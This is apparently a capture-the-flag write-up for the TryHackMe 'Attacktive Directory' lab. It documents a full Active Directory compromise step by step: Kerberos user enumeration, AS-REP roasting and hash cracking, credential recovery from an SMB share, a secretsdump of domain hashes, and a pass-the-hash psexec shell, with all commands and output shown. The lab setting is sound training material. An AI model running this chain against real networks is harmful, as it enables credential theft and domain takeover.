# THM: Attacktive Directory

## Reconnaissance

There was a lot of services running but I found nothing of interest so I use 
kerbrute to enumerate usernames with the supplied user list. I put the found 
usernames into a file called `valid-users.txt`. 

```
[kali@kali ~/thm/attacktivedirect/exploit] /opt/kerbrute/kerbrute_linux_386 userenum -d spookysec.local --dc 10.10.124.116  userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/22/22 - Ronnie Flathers @ropnop

2022/11/22 13:27:10 >  Using KDC(s):
2022/11/22 13:27:10 >  	10.10.124.116:88

2022/11/22 13:27:10 >  [+] VALID USERNAME:	 james@spookysec.local
2022/11/22 13:27:14 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2022/11/22 13:27:18 >  [+] VALID USERNAME:	 James@spookysec.local
2022/11/22 13:27:19 >  [+] VALID USERNAME:	 robin@spookysec.local
2022/11/22 13:27:34 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2022/11/22 13:27:43 >  [+] VALID USERNAME:	 administrator@spookysec.local
2022/11/22 13:28:02 >  [+] VALID USERNAME:	 backup@spookysec.local
2022/11/22 13:28:10 >  [+] VALID USERNAME:	 paradox@spookysec.local
2022/11/22 13:29:07 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2022/11/22 13:29:26 >  [+] VALID USERNAME:	 Robin@spookysec.local

```

I then checked if any of the users were ASREP-roastable. 

``` 
[kali@kali ~/thm/attacktivedirect/exploit] impacket-GetNPUsers spookysec.local/ 
-usersfile valid-users.txt -format john -outputfile asrep.hash
```

The user `svc-admin` was ASREP-roastable so I cracked the hash using `john` and
the supplied password list. 

```
[kali@kali ~/thm/attacktivedirect/exploit] cat asrep.hash        
$krb5asrep$svc-admin@SPOOKYSEC.LOCAL:4131a2d8f638101f7eeff8562a7d6fcf$b0ad0ec99a2b6e1713f104382802551d66ed31074808021d0054a5a45ffbdf12fb0c4956a46217f3cbee505bdda52d9a806a8a667d84cc446555f9642a24a08f123cca553c629d976d67f4dd5ec417847935a3ee114b3817f6feb68cd195a905ed07d437b4d0b377768604a59926a4d04dcc49167af00d455574af048f63b59efef3675690734b190c1d3434c54667053c1c4ebd8f24c6f5a42f02d47748ff3c58c2b0f25ac4dfe5ed1e3de2fc2bc8818a69f32c739662a6899664eec8afe0c8f7f06af8cca232b66dd765b4e0550c846b20682e401b59fdc5ebc1c1f3c767c2df2c70ab6179892cf26a8b862997f5c2878e
```

```
[kali@kali ~/thm/attacktivedirect/exploit] john --wordlist=passwordlist.txt --format=krb5asrep asrep.hash                                        
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:00 DONE (2022-11-22 13:56) 100.0g/s 665600p/s 665600c/s 665600C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I attempted to log in with this user via the usual methods without success.
However, listing the SMB shares now as an authenticated user you can now access
the "backup" share.

```
[kali@kali ~/thm/attacktivedirect/exploit] smbclient -U 'svc-admin' -L  \\\\10.10.124.116\\                                                                        
Password for [WORKGROUP\svc-admin]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

Located in the backup share is a file called `backup_credentials.txt` which
contained base64 text. Decoding the text yields a set of credentials for the
user "backup."

```
[kali@kali ~/thm/attacktivedirect/loot] smbclient -U 'svc-admin'  \\\\10.10.124.116\\backup
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

		8247551 blocks of size 4096. 3609222 blocks available

```

```
[kali@kali ~/thm/attacktivedirect/loot] cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860 
```

## Initial Access

I attempted to log in with this user via the usual means without success. Given
the name of the user I tried Impacket's secretsdump which dumped the hashes of
all users including the Administrator and krbtgt accounts.

```
[kali@kali ~/thm/attacktivedirect] impacket-secretsdump -dc-ip 10.10.124.116 backup:backup2517860@spookysec.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
```

I was now able to log in as the Administrator using psexec and a Pass-The-Hash
ttack.

```
[kali@kali /opt] impacket-psexec -dc-ip 10.10.124.116 administrator@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on spookysec.local.....
[*] Found writable share ADMIN$
[*] Uploading file oPwWfckV.exe
[*] Opening SVCManager on spookysec.local.....
[*] Creating service slcY on spookysec.local.....
[*] Starting service slcY.....
[!] Press help for extra shell commands                                              Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```
